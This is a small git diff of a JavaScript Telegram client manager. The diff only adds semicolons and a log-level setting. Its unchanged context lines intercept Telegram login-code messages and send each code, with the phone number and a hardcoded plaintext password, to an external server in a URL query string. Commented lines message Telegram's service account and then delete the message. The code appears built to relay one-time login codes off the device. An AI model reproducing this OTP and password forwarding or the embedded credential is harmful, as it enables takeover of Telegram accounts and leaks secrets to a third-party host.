@@ -86,7 +86,8 @@ class TelegramManager {
             this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                 connectionRetries: 5,
             });
-            console.log("Stating Client - ", this.phoneNumber)
+            console.log("Stating Client - ", this.phoneNumber);
+            this.client.setLogLevel('error');
             await this.client.connect();
             // const msg = await this.client.sendMessage("777000", { message: "." });
             // await msg.delete({ revoke: true });
@@ -619,7 +620,7 @@ class TelegramManager {
                 if (activeClientSetup && this.phoneNumber === activeClientSetup?.phoneNumber) {
                     console.log("LoginText: ", event.message.text)
                     const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
-                    console.log("Code is:", code)
+                    console.log("Code is:", code);
                     try {
                         const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                         console.log("Code Sent");
